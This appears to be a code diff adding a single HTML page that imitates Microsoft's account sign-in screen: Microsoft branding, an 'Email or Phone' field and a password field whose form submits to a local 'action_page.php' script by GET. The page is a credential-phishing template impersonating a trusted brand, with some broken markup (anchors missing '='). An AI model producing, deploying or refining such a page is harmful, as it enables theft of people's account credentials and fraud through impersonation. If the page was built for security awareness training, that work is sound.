@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Sign in to your Microsoft Account</title>
+	<link rel="icon" type="image/png" href="title.png">
+	<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
+	<style type="text/css">
+		.large{
+			margin-top: 10px;
+			padding: 5px;
+			width: 100%;
+		}
+		.textBoxDecoration{
+			border-color: grey;
+			height: 32px; 
+			border-width: 2px;
+			border-style: solid;
+		}
+		.textBoxDecoration:active{
+			/* left down */
+			box-shadow: 0px 1px 5px 2px #0078d7;
+		}
+		div{
+			align-items: center;
+			flex-wrap: wrap;
+		}
+		input[type=checkbox]
+		{
+			transform: scale(1.5); /* Safari and Chrome */
+			margin-left: 5px;
+		}
+		.checkboxtext
+		{
+		  /* Checkbox text */
+		  font-size: 110%;
+		  display: inline;
+		}
+	</style>
+</head>
+<body style="background-color: white;">
+
+<div style="background-color: white; width: 352px; margin: 0 auto;">
+	<div style="background-color: white; margin-right: 10px">
+		<img src="logo.png">
+		<br>
+		<p style="text-align:center"><a href="#">What's this?</a></p>
+		
+		<form action="action_page.php" method="get">
+		<input class="large textBoxDecoration" type="FirstName" name="first" placeholder="Email or Phone">
+		
+		<input class="large textBoxDecoration" type="password" name="first" placeholder="Password">
+		<br><br>
+		<input class="checkboxtext" type="checkbox" name="vehicle" value="Bike"><span class="checkboxtext">
+			&nbsp Keep me signed in</span>
+		<br><br>
+		<button class="large" style="border-style: none; height: 32px; background-color: #0078d7" type="submit" name="Go">
+		<span style="color: white">Sign In</span></button>
+		</form>
+
+		<br>
+		<p style="text-align:center"> No account? <a href"#"> Create one!</a></p>
+		<br><br>
+
+		<p style="text-align:center"><a href"#"> Forgot my password</a></p>
+		<p style="text-align:center"><a href"#"> Sign in with a single-use code</a></p>
+		<br>
+		<div>
+		<p style="text-align:center"><a href"#"> Terms of Use</a> &nbsp &nbsp &nbsp &nbsp<a href="#"> Privacy & Cookies</a></p>
+		</div>
+		<img style="width: 100%" src="Microsoft.png">
+	</div>
+</div>
+
+</body>
+</html>
